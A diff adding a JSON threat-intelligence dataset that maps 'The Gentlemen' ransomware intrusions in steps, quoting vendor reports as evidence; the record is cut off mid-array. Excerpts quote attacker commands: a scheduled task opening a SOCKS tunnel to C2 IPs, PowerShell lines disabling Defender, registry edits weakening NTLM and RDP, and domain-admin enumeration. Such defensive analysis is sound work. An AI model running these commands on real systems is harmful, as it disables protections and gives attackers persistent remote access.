@@ -1,0 +1,1550 @@
+{
+  "actions": [
+    {
+      "action_time_text": "Activity visible as far back as May 13",
+      "action_type": "action",
+      "activity_id": "tar_activity_4de236cdb5a9f74187d0c14c",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "Two C2 endpoints are shown; one command is described as a previous creation attempt.",
+      "evidence": [
+        {
+          "block_index": 33,
+          "excerpt": "The threat actor created Scheduled Tasks that were detected on impacted endpoints, which executed a malicious binary from the temp folder. The binary ( svchost32.exe ), disguised as the legitimate Windows system process svchost.exe , created a SOCKS proxy connection to a command…",
+          "id": "tar_evidence_6b92457eb6fffd1301fd7c78",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 34,
+          "excerpt": "C:\\Windows\\Temp\\svchost32.exe client 193.233.202[.]17:44729 R:1081:socks",
+          "id": "tar_evidence_d37c3d579b18f297688d6521",
+          "order": 1,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 35,
+          "excerpt": "We also observed a command line from a previous attempt to create a malicious Scheduled Task at a different address, which appeared as follows:",
+          "id": "tar_evidence_7a43a311d3c73dcbf4fe48a6",
+          "order": 2,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 36,
+          "excerpt": "cmd.exe /C schtasks /create /tn WindowsConnSvc /tr C:\\Windows\\Temp\\svchost32.exe client 77.110.122[.]137:37182 R:1085:socks /sc minute /mo 2 /ru SYSTEM /f > C:\\Windows\\Temp\\RbHoNVNU.tmp 2>&1",
+          "id": "tar_evidence_6ac1b82b8c1baff926bcf743",
+          "order": 3,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 37,
+          "excerpt": "The Scheduled Task was set to launch every 2 minutes, and for all intents and purposes, after the first launch, one would expect the TaskScheduler Event Log to be full of TaskScheduler/332 events, indicating that the subsequent task could not launch because there was already a c…",
+          "id": "tar_evidence_e447ce39ae614035fce724cf",
+          "order": 4,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-may:scheduled-proxy",
+      "id": "tar_action_63e4b5991b6977a889785334",
+      "label": "Maintain SOCKS proxy persistence through WindowsConnSvc Scheduled Task",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-may-construction",
+      "sequence_hint": 0,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": "May 15",
+      "action_type": "action",
+      "activity_id": "tar_activity_4de236cdb5a9f74187d0c14c",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "Initial access remains outside visibility.",
+      "evidence": [
+        {
+          "block_index": 23,
+          "excerpt": "More recently, the Huntress agent was installed post-incident, on May 18, on three endpoints belonging to a construction company. The Huntress agent was not installed at the beginning of the attack, limiting our visibility into the initial access vector for the incident. However…",
+          "id": "tar_evidence_48afec6182a519543fe57f9f",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 24,
+          "excerpt": "The file encryption had also started days earlier before the Huntress agent was installed, on May 15. As seen in Figure 2, the threat actor’s first attempt to execute the encryptor was picked up by Microsoft Defender on that date as well ( Ransom:Win64/Gentlemen.SH!MTB ).",
+          "id": "tar_evidence_f0720ff16cba53eb12c3c3ba",
+          "order": 1,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 25,
+          "excerpt": "A closer look at the Defender alert in Figure 2 shows several differences in this incident versus the one in April. Unlike the incident’s encryptor in April, this incident’s file encryption executable had a different name ( G_hlm7jj_windows_amd64.exe ). The threat actors also op…",
+          "id": "tar_evidence_4c1eb85244a05f42d3bf505c",
+          "order": 2,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-may:first-encryptor-attempt",
+      "id": "tar_action_5a55399a0690cb7daebff3ac",
+      "label": "Attempt execution of G_hlm7jj_windows_amd64.exe from Downloads",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-may-construction",
+      "sequence_hint": 1,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_4de236cdb5a9f74187d0c14c",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The report does not state the exact order between log clearing and Defender tampering.",
+      "evidence": [
+        {
+          "block_index": 27,
+          "excerpt": "After their initial attempt to deploy the ransomware failed, the threat actor mixed things up, and we observed several defense evasion techniques. Several Windows Event Logs were cleared by the attacker - but several more remained intact. Those remaining logs, coupled with the P…",
+          "id": "tar_evidence_2843e80c6a69afaccd8ae45e",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-may:clear-logs",
+      "id": "tar_action_8d3e3315db86dfffb71ddbeb",
+      "label": "Clear selected Windows Event Logs",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-may-construction",
+      "sequence_hint": 2,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_4de236cdb5a9f74187d0c14c",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "Five source-observed PowerShell command lines are retained as evidence; none are marked execution-ready.",
+      "evidence": [
+        {
+          "block_index": 27,
+          "excerpt": "After their initial attempt to deploy the ransomware failed, the threat actor mixed things up, and we observed several defense evasion techniques. Several Windows Event Logs were cleared by the attacker - but several more remained intact. Those remaining logs, coupled with the P…",
+          "id": "tar_evidence_2843e80c6a69afaccd8ae45e",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 28,
+          "excerpt": "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true; Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled",
+          "id": "tar_evidence_137f7a5fe285ee0182ec2b99",
+          "order": 1,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 29,
+          "excerpt": "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true -Force",
+          "id": "tar_evidence_c83c49b69517ab1e5f29157a",
+          "order": 2,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 30,
+          "excerpt": "powershell -Command Set-MpPreference -EnableControlledFolderAccess Disabled -Force",
+          "id": "tar_evidence_ac8aaaa4a77c74197e90868c",
+          "order": 3,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 31,
+          "excerpt": "powershell -Command Add-MpPreference -ExclusionProcess C:\\Users\\[REDACTED]\\downloads\\G_hlm7jj_windows_amd64.exe -Force",
+          "id": "tar_evidence_d9d808e49706e149f4d0abb5",
+          "order": 4,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 32,
+          "excerpt": "powershell -Command Add-MpPreference -ExclusionPath C:\\ -Force",
+          "id": "tar_evidence_ed7bed83bd8dd37e7f1bd1f5",
+          "order": 5,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-may:defender-tamper",
+      "id": "tar_action_f84342fb3be7b1ba3a442625",
+      "label": "Disable Microsoft Defender controls and add broad exclusions",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-may-construction",
+      "sequence_hint": 3,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_4de236cdb5a9f74187d0c14c",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The exact redeployment command is not present in the report text.",
+      "evidence": [
+        {
+          "block_index": 27,
+          "excerpt": "After their initial attempt to deploy the ransomware failed, the threat actor mixed things up, and we observed several defense evasion techniques. Several Windows Event Logs were cleared by the attacker - but several more remained intact. Those remaining logs, coupled with the P…",
+          "id": "tar_evidence_2843e80c6a69afaccd8ae45e",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-may:redeploy-encryptor",
+      "id": "tar_action_c7587c661506bcfbdca2dbae",
+      "label": "Redeploy the encryptor after defense evasion",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-may-construction",
+      "sequence_hint": 4,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_4de236cdb5a9f74187d0c14c",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed_telemetry",
+      "confidence": "medium",
+      "date_basis": "unresolved",
+      "description": "The source reports logon telemetry after Security-log clearing; exact operator attribution and command are not shown.",
+      "evidence": [
+        {
+          "block_index": 42,
+          "excerpt": "On another endpoint, after the Security Event Log had been cleared, session information derived from data from the subsequent three days until the Huntress agent was installed illustrated logins to the compromised user account, originating from the workstation WIN-8OA3CCQAE4D ,…",
+          "id": "tar_evidence_1cff8bb06b6c1a43653630e5",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-may:compromised-account-logons",
+      "id": "tar_action_feb0440d092b85b05086b946",
+      "label": "Use compromised account for subsequent logons from WIN-8OA3CCQAE4D",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-may-construction",
+      "sequence_hint": 5,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": "April 9",
+      "action_type": "action",
+      "activity_id": "tar_activity_7bbe65a2893620e9116772dd",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "First point visible in the available logs; not claimed as initial access.",
+      "evidence": [
+        {
+          "block_index": 12,
+          "excerpt": "The first point of visibility we had for the Windows Event Logs started on April 9 and showed the threat actor initiating a Remote Desktop Protocol (RDP) connection using a compromised user’s account. This doesn’t necessarily mean that initial access was achieved via RDP; rather…",
+          "id": "tar_evidence_03382529d7db5e543868f949",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-april:rdp-session",
+      "id": "tar_action_48f04ad32122228cb8ac7caf",
+      "label": "RDP session established with a compromised account",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-april-shipping",
+      "sequence_hint": 0,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_7bbe65a2893620e9116772dd",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The command is source-observed but redacted and not execution-ready.",
+      "evidence": [
+        {
+          "block_index": 13,
+          "excerpt": "Shortly after the threat actor initiated and then established the RDP connection, they attempted to run the file encryptor ( win.exe ) locally from the Documents folder, as seen in the following command line:",
+          "id": "tar_evidence_9680bb6ae47e58534ad10eab",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 14,
+          "excerpt": "C:\\Users\\REDACTED\\Documents\\win.exe --password [REDACTED_CREDENTIAL] --T 200 --superfast",
+          "id": "tar_evidence_ef4ab66ae62a793f61627c47",
+          "order": 1,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "block_index": 15,
+          "excerpt": "Windows Event Logs (specifically Microsoft Defender Event IDs 1116 and 1117) showed Microsoft Defender detecting and blocking this attempt. The logs also showed Defender detecting and blocking Trojan:Win32/MpTamperBulkExcl.H , a PowerShell script that was executed and attempted…",
+          "id": "tar_evidence_c30e528d65817379317f4b59",
+          "order": 2,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-april:local-encryptor-attempt",
+      "id": "tar_action_9886f2d1718e87ca311ce459",
+      "label": "Attempt local execution of win.exe from the user Documents folder",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-april-shipping",
+      "sequence_hint": 1,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_7bbe65a2893620e9116772dd",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The report does not provide the Scheduled Task command for this incident.",
+      "evidence": [
+        {
+          "block_index": 16,
+          "excerpt": "The threat actor then created a series of Scheduled Tasks (likely on the Domain Controller, as we didn’t see the Event Log Microsoft-Windows-TaskScheduler/140 records that we would expect to see with tasks created locally on the endpoint). One of these was used to run the file e…",
+          "id": "tar_evidence_990ff68fa3e99daef36fe0a3",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-april:scheduled-task-redeploy",
+      "id": "tar_action_a632ac81f44a128f8ae41ffd",
+      "label": "Create Scheduled Tasks and use one to rerun the encryptor",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-april-shipping",
+      "sequence_hint": 2,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": "April 10",
+      "action_type": "action",
+      "activity_id": "tar_activity_7bbe65a2893620e9116772dd",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "Exact placement relative to the redeployment steps is not stated.",
+      "evidence": [
+        {
+          "block_index": 17,
+          "excerpt": "On April 10, the attacker also cleared the System , Application , and Security Windows Event Logs. We get a clear forensic breadcrumb here through a series of Event Logs (specifically Event ID 104 for the Application and System Logs, and Event ID 1102 for the Security log, showi…",
+          "id": "tar_evidence_2c41df8767db7882773fe0c6",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-april:clear-logs",
+      "id": "tar_action_be0b91241449c953969cbce7",
+      "label": "Clear Security, System, and Application event logs",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-april-shipping",
+      "sequence_hint": 3,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": "April 10",
+      "action_type": "action",
+      "activity_id": "tar_activity_7bbe65a2893620e9116772dd",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The report does not prove that the Scheduled Task caused this specific execution.",
+      "evidence": [
+        {
+          "block_index": 20,
+          "excerpt": "These showed a second instance of the same win.exe ransomware payload detected on April 10, which was found on the NETLOGON share and executed by the SYSTEM account through the Configuration Manager Client ( CcmExec.exe ). As Figure 1 indicates (and Microsoft Defender Event ID 1…",
+          "id": "tar_evidence_6a2844752940ceb2c22e280b",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-april:netlogon-system-deploy",
+      "id": "tar_action_8dc491d9beca2ec191f92c04",
+      "label": "Execute a second win.exe from NETLOGON as SYSTEM via CcmExec.exe",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-april-shipping",
+      "sequence_hint": 4,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_7bbe65a2893620e9116772dd",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "Observed after successful payload deployment.",
+      "evidence": [
+        {
+          "block_index": 21,
+          "excerpt": "After the payload was successfully deployed, files were encrypted with an extension .fjn1jw and the ransom note ( README-GENTLEMEN.txt ) was dropped.",
+          "id": "tar_evidence_475b71db3f9454f27e545199",
+          "order": 0,
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:huntress-april:encrypt-and-note",
+      "id": "tar_action_1961cec01f1cbde1df32bbf5",
+      "label": "Encrypt files and drop README-GENTLEMEN.txt",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "huntress-april-shipping",
+      "sequence_hint": 5,
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "Initial access is explicitly unconfirmed; the executable path is an artifact, not a complete command.",
+      "evidence": [
+        {
+          "block_index": 24,
+          "excerpt": "Although the exact initial access vector remains unconfirmed for this specific incident, our investigation suggests the threat actors likely exploited internet-facing services or compromised credentials to establish their initial foothold. The presence of network reconnaissance…",
+          "id": "tar_evidence_ac851a28220c5bcbf07d60f3",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 25,
+          "excerpt": "C:\\Program Files (x86)\\Advanced IP Scanner\\advanced_ip_scanner.exe",
+          "id": "tar_evidence_37e2a00b1ae425f90dd3e135",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:network-recon",
+      "id": "tar_action_03b64da3d448adfa55448fc7",
+      "label": "Map the environment with Advanced IP Scanner",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 0,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "Seven lines are incomplete command fragments because the source omits the leading utility name.",
+      "evidence": [
+        {
+          "block_index": 27,
+          "excerpt": "During the discovery phase, the threat actor examined Active Directory structures, focusing on domain administrators, enterprise administrators, and custom privilege groups such as itgateadmin .",
+          "id": "tar_evidence_592650d7ed674d16328217a3",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 28,
+          "excerpt": "One notable technique used by The Gentlemen involved the use of a batch script named 1.bat to perform mass account enumeration, querying more than 60 user accounts across the domain infrastructure:",
+          "id": "tar_evidence_1d065590d50a58add9d390df",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 29,
+          "excerpt": "user admin.it /dom",
+          "id": "tar_evidence_17e5f6da80e99a1b7fa7dedb",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 30,
+          "excerpt": "user administrator /dom",
+          "id": "tar_evidence_efb6e66d0ed278c9b51af509",
+          "order": 3,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 31,
+          "excerpt": "user fortigate /dom",
+          "id": "tar_evidence_5890baa27bd99f194591f8dc",
+          "order": 4,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 32,
+          "excerpt": "group \"domain admins\" /dom",
+          "id": "tar_evidence_742d0621722b73f59024f283",
+          "order": 5,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 33,
+          "excerpt": "group \"Enterprise admins\" /dom",
+          "id": "tar_evidence_e698847a7c09e0f0f60b2b49",
+          "order": 6,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 34,
+          "excerpt": "localgroup __vmware__",
+          "id": "tar_evidence_3169ca8903cb2eac59829f87",
+          "order": 7,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 35,
+          "excerpt": "localgroup administrators",
+          "id": "tar_evidence_773ae41ce74c65055a19ab74",
+          "order": 8,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 36,
+          "excerpt": "[additional net user commands]",
+          "id": "tar_evidence_0a20e23a4a9963b9d9d786f3",
+          "order": 9,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 37,
+          "excerpt": "They also demonstrated extensive environmental awareness by querying local groups, including standard administrative groups and virtualization-specific groups such as VMware, indicating preparation for lateral movement across both physical and virtualized infrastructure componen…",
+          "id": "tar_evidence_118a631e3e537e6a90125f65",
+          "order": 10,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:account-group-enum",
+      "id": "tar_action_eedd3d9071706be7a9f07de6",
+      "label": "Enumerate domain accounts and privileged groups using 1.bat",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 1,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The arrow line is an execution relationship, not an exact shell command.",
+      "evidence": [
+        {
+          "block_index": 39,
+          "excerpt": "The group's initial defense evasion strategy centered on deploying All.exe in conjunction with ThrottleBlood.sys, leveraging a sophisticated technique previously documented in by other researchers in this report . This approach exploits a legitimate signed driver to perform kern…",
+          "id": "tar_evidence_2b223d9d8d7abe34ffcc8dcd",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 40,
+          "excerpt": "$myuserprofile$\\Downloads\\All.exe → $myuserprofile$\\Downloads\\ThrottleBlood.sys",
+          "id": "tar_evidence_0bf8edb0985f75a16366fcde",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:all-throttleblood",
+      "id": "tar_action_60690c783922a7c132d98207",
+      "label": "Use All.exe with ThrottleBlood.sys to terminate protected security processes",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 2,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "No exact command is provided.",
+      "evidence": [
+        {
+          "block_index": 41,
+          "excerpt": "Recognizing the limitations of this initial approach, the threat actors shifted tactics and began conducting detailed reconnaissance of the endpoint protection mechanisms in place. This allowed them to identify specific security controls and tailor their methods accordingly.",
+          "id": "tar_evidence_67088ce476e595d7f5f6e335",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:security-product-recon",
+      "id": "tar_action_dca8c66315aa4cb94ad6e114",
+      "label": "Reconnoiter endpoint protections and adapt evasion methods",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 3,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The report describes intent and use but does not provide a command line.",
+      "evidence": [
+        {
+          "block_index": 42,
+          "excerpt": "Next, they deployed PowerRun.exe , a legitimate tool frequently abused for privilege escalation. By leveraging PowerRun.exe , the attackers attempted to execute high-privilege operations, aiming to disable or terminate security-related services and processes.",
+          "id": "tar_evidence_494c3b1a87a000920decfe67",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:powerrun",
+      "id": "tar_action_d2c058725249ced4c0d53519",
+      "label": "Deploy PowerRun.exe for high-privilege operations against security services",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 4,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "Introduced after environment-specific reconnaissance.",
+      "evidence": [
+        {
+          "block_index": 44,
+          "excerpt": "After gathering sufficient information, the threat actors introduced an enhanced version of their defense evasion tool, Allpatch2.exe . This tool was specifically customized to neutralize key security agent components by targeting and terminating relevant processes. Their abilit…",
+          "id": "tar_evidence_45086fab59856e1a31795840",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:allpatch2",
+      "id": "tar_action_7042b137d11d0d69cd5251c4",
+      "label": "Deploy customized Allpatch2.exe defense-evasion tooling",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 5,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The source provides three exact registry command lines.",
+      "evidence": [
+        {
+          "block_index": 46,
+          "excerpt": "The threat actors leveraged PsExec for lateral movement, demonstrating proficiency in living-off-the-land techniques. They systematically weakened security controls by modifying critical registry settings that govern authentication and remote access protocols:",
+          "id": "tar_evidence_66c480e52e97c9d5827acfef",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 47,
+          "excerpt": "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0 /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f",
+          "id": "tar_evidence_bf3c4a8d94afb3830fe0bf17",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 48,
+          "excerpt": "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f",
+          "id": "tar_evidence_88e0ddca37abfabf3015973d",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 49,
+          "excerpt": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 1 /f",
+          "id": "tar_evidence_327b7183cae47651824eb1f5",
+          "order": 3,
